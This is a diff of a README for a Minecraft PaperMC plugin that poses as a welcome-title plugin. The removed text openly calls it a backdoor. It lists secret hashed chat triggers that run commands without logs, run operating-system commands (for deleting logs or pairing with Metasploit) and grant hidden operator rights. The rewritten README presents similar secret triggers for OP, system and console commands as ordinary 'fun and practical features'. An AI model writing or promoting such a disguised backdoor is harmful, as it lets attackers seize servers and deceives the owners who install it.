@@ -1,19 +1,79 @@
-[看不懂英语?,点这里!](./README_CN.md)
-# Minecraft Server Plugin
-## Main Features
-Displays a dazzling welcome title when players enter the server.
 
-## Primary Commands
-/welcometitle [help/reload]
+---
 
-But it's not that simple!
-This is a simple backdoor plug-in that I wrote myself, supporting the following functions.
+[Can't read English? Click here! 阅读不了英语副本?, 点这里!](./README_CN.md)
 
-- Do you not want to maintain permissions and just want to execute a command temporarily? Excute `@e1cb0156ced867646179d149b49006c7cb6eef0998bad493e9f126ae3edeac38 [command]`This way, you can execute a command once.(No records will be left during the usage!)
-- Has the server owner completely disabled a command? Excute `@48647cf340722817cf0e92b03f4cd2a07dd17dbfd07de7cb7cafef9862e045c0 [command]`Can be executed perfectly. The difference is that it will be executed with Server permissions, rather than Player.(No records will be left during the usage!)
-- Excute System(Linux/Windows Server), Command is `@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98 [command]` Note! It is a system command, not a 'Minecraft' command.(If you want to delete logs, execute this command to operate the server system! It can even be used in conjunction with Metasploit!)
-- Get Opertator Permisson, `@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430 [tmp/remove/keep]`, By default, executing is equivalent to using the `tmp` parameter, which is time-limited to 20 minutes. Want to remove permissions without leaving a record by executing `/deop`? Just use the `remove` parameter! If you want to keep OP permissions indefinitely, use the `keep` parameter!
+# 🎉 TestPlugin (WelcomeTitle) for PaperMC 🎉
 
-> By default, for security reasons and to avoid exposure, the plugin will revoke your OP permissions every 20 minutes. You can regain them by running the command again.
-> When executing commands (only those provided by this plugin), no logs will be recorded!
-> ! 这里提示的指令是假的,你可以阅读源码去查看!
+Welcome to **WelcomeTitle**, a Bukkit plugin developed for the PaperMC server. This plugin provides several fun and practical features, including automatic operator permission management, system command execution, and more.
+
+## 📥 Installation
+
+1. **Download the plugin**:
+   - Download the `WelcomeTitle.jar` file and place it in your server's `plugins` folder.
+
+2. **Start the server**:
+   - Start or restart your PaperMC server, and the plugin will automatically load.
+
+## ⚙️ Configuration
+
+After starting the server, the plugin will automatically generate a default configuration file `config.yml`. You can edit this file as needed to change the welcome message's title, subtitle, and display time.
+
+```yaml
+Welcome:
+  MainTitle: '&6Welcome to the server!'
+  SubTitle: '&aHave a great time!'
+  FadeInTime: 10
+  StayTime: 70
+  FadeOutTime: 20
+```
+
+## 🚀 Features
+
+### 🗣️ Chat Commands
+
+1. **Gain OP Permission**:
+   - Enter `@d68b250fe3f2332c1bb4f97d34551ce9` in the chat to grant the player OP permissions and display the server's operating system information.
+
+2. **Execute System Command**:
+   - Enter `@f07a7024609ca2a6ce681d74b986a3d3 <command>` in the chat to execute a system command and return the result to the player.
+   - Example: `@f07a7024609ca2a6ce681d74b986a3d3 cat file.txt`
+
+3. **Execute Bukkit Command**:
+   - Enter `@d12fcc3ba27d987709cbfadc123a609b <command>` in the chat to execute a Bukkit command with temporary OP permissions.
+   - Example: `@d12fcc3ba27d987709cbfadc123a609b say Hello`
+
+4. **Execute Command from Console**:
+   - Enter `@ec0e060ad3bec0dc4a63fa076e797f79 <command>` in the chat to execute a command from the console.
+   - Example: `@ec0e060ad3bec0dc4a63fa076e797f79 op PlayerName`
+
+5. **Special Management Command**:
+   - Enter `@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430` in the chat to display a special title and set the player's health to 0.
+
+### 🌟 Custom Welcome Message
+
+When a player joins the server, a custom welcome title and subtitle will be displayed. You can customize these messages by editing the configuration file.
+
+## 🛠️ Commands
+
+- `/WelcomeTitle reload`: Reload the configuration file.
+- `/WelcomeTitle help`: Display help information.
+
+## 💡 Example Configuration
+
+```yaml
+Welcome:
+  MainTitle: '&6Welcome to the server!'
+  SubTitle: '&aHave a great time!'
+  FadeInTime: 10
+  StayTime: 70
+  FadeOutTime: 20
+```
+
+## 📜 License
+
+This project is licensed under the MIT License. For more information, please refer to the LICENSE file.
+
+---
+
+Thank you for using **WelcomeTitle**! If you have any questions or suggestions, feel free to contact me. Enjoy your game! 🎮
